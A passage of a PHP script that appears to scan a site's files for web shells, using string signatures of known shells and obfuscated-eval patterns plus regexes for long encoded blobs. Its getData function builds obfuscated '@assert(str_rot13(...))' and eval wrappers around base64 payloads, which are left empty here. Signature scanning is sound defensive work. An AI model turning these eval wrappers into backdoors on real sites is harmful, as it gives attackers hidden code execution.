            5010 => '<form method="POST" action=""><font size=2 color=#888888><b>Command</b><br><input type="text" name="cmd"><input type="Submit" name="command" value="cok"></form>',
            5011 => '<form method=post><input type=text name=pass><input type=submit value=ok></form>',
            5012 => '<h1>#p@@#</h1>',
            5013 => '<input name="_upl" type="submit" id="_upl" value="Upload">',
            5014 => '<input type="submit" value="&gt;"/>',
            5015 => '<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value=\'>>\'></form></pre>',
            5016 => '<span>Uname:<br>User:<br>PHP:<br>Disabled:<br>HDD:<br>Site:<br>Root:<br>CWD:</span></td><td>',
            5017 => 'Krist_ALL edition  - z e b r a',
            5018 => 'Upload file: <input type=file name=f><input type=submit value=\'>>\'></form></body></html>',
            5019 => 'rootshell-team.info',
            5020 => 'OSFM Static',
            5021 => 'WebShellOrb',
            5022 => 'b374k',
            5023 => 'PHP Uploader - Yacine_Mohamed',
            5024 => '<input type=\'file\' name=\'zb\'><input type=\'submit\' name=\'upload\' value=\'upload\'>',
            //
            6000 => 'shell',
            // UPLOAD
			9700 => 'move_uploaded_file',
			//
            9800 => 'eval(gzuncompress(base64_decode(',
            9801 => 'eval(gzinflate(base64_decode(',
            9802 => 'eval(base64_decode',
            //
            9900 => 'assert',
            9901 => 'eval',
//            10000 => '',
        ),
        'regex' => array(
//            100 => '',
            //
			4000 => '#[a-f0-9]{32,32}#i',
			//
            5000 => '#[a-z0-9\-\+\=/]{1000,}#i',
            5001 => '#[a-z0-9\-\+\=/]{900,}#i',
            5002 => '#[a-z0-9\-\+\=/]{800,}#i',
            5003 => '#[a-z0-9\-\+\=/]{700,}#i',
            5004 => '#[a-z0-9\-\+\=/]{600,}#i',
            5005 => '#[a-z0-9\-\+\=/]{500,}#i',
            5006 => '#[a-z0-9\-\+\=/]{400,}#i',
            5007 => '#[a-z0-9\-\+\=/]{300,}#i',
            5008 => '#[a-z0-9\-\+\=/]{200,}#i',
            5009 => '#[a-z0-9\-\+\=/]{100,}#i',
            5010 => '#[a-z0-9\-\+\=/]{50,}#i',
        //
//            10000 => '',
        ),
    );

    if ($type == 'str') {
        if (function_exists('mb_stripos')) {
            foreach ($suspected['str'] as $key => $suspect) {
//                die($suspect . '|||' . $content);
                if (!empty($content) && !empty($suspect) && mb_stripos($content, $suspect, 0, 'utf-8') !== false) {
                    $find_files[] = '[file_suspected_str]' . $file . ';' . $key . '[/file_suspected_str]';

                    if (!empty($file) && !empty($root_dir) && mb_stripos($file, $root_dir, 0, 'utf-8') !== false) {
                        $url = getUrl($file, $root_dir);
                        $find_files_root[] = '[root_file_suspected_str]' . $url . ';' . $key . '[/root_file_suspected_str]';
                    }
//                    return array($find_files, $find_files_root);
                    break;
                }
            }
        } else {
            foreach ($suspected['str'] as $key => $suspect) {
                if (!empty($content) && !empty($suspect) && stripos($content, $suspect, 0) !== false) {
                    $find_files[] = '[file_suspected_str]' . $file . ';' . $key . '[/file_suspected_str]';

                    if (!empty($file) && !empty($root_dir) && stripos($file, $root_dir) !== false) {
                        $url = getUrl($file, $root_dir);
                        $find_files_root[] = '[root_file_suspected_str]' . $url . ';' . $key . '[/root_file_suspected_str]';
                    }
//                    return array($find_files, $find_files_root);
                    break;
                }
            }
        }
    }

    if ($type == 'regex') {
        foreach ($suspected['regex'] as $key => $suspect) {
            if (preg_match($suspect, $content, $arr)) {
                $info = (!empty($arr[1])) ? serialize($arr[1]) : 'none';
                $find_files[] = '[file_suspected_regex]' . $file . ';' . $key . ';' . $info . '[/file_suspected_regex]';

                if (function_exists('mb_stripos')) {
                    if (!empty($file) && !empty($root_dir) && mb_stripos($file, $root_dir, 0, 'utf-8') !== false) {
                        $url = getUrl($file, $root_dir);
                        $find_files_root[] = '[root_file_suspected_regex]' . $url . ';' . $key . ';' . $info . '[/root_file_suspected_regex]';
                    }
                } else {
                    if (!empty($file) && !empty($root_dir) && stripos($file, $root_dir) !== false) {
                        $url = getUrl($file, $root_dir);
                        $find_files_root[] = '[root_file_suspected_regex]' . $url . ';' . $key . ';' . $info . '[/root_file_suspected_regex]';
                    }
                }

                //return array($find_files, $find_files_root);
                break;
            }
        }
    }

    return array($find_files, $find_files_root);
}

function win_is_writable($path)
{
    if ('/' === $path[strlen($path) - 1]) {
        // If it looks like a directory, check a random file within the directory.
        return win_is_writable($path . uniqid(mt_rand()) . '.tmp');
    } elseif (is_dir($path)) {
        // If it's a directory (and not a file), check a random file within the directory.
        return win_is_writable($path . '/' . uniqid(mt_rand()) . '.tmp');
    }

    // Check tmp file for read/write capabilities.
    $should_delete_tmp_file = !file_exists($path);

    $f = @fopen($path, 'a');
    if (false === $f) {
        return false;
    }
    fclose($f);

    if ($should_delete_tmp_file) {
        unlink($path);
    }

    return true;
}

function rand_str($count)
{
    $symbols = "qwertyuipasdfghjkzxcvbnm";
    $word = '';
    $i = 0;
    $count = $count - 1;
    while ($i <= $count) {
        $word .= $symbols[mt_rand(0, strlen($symbols) - 4)];
        $i++;
    }
    return $word;
}

function getData($type = 'unknown')
{
    $dgh = "";

    $lsh = "";

    switch ($type) {
        case('lsh_assert'):
            $code = base64_decode($lsh);
            return '<?php @assert(str_rot13("' . $code . '")); ?>';
            break;
        case('lsh_eval'):
            $code = base64_decode($lsh);
            $code = str_rot13($code);
            return '<?php ' . $code . ' ?>';
            break;
        case('lsh_code_arr'):
            return array('MKMuoPuvLKAyAwEsMTIwo2EyXTq6qJ5', 'ZXZhbChiYXNlNjRfZGVjb2RlKGd6dW5');
            break;
        case('dgh_assert'):
            $code = base64_decode($dgh);
            return '<?php @assert(str_rot13("' . $code . '")); ?>';
            break;
        case('dgh_eval'):
            $code = base64_decode($dgh);
            $code = str_rot13($code);
            return '<?php ' . $code . ' ?>';
            break;
        default:
            break;
    }

    return false;
}
?>

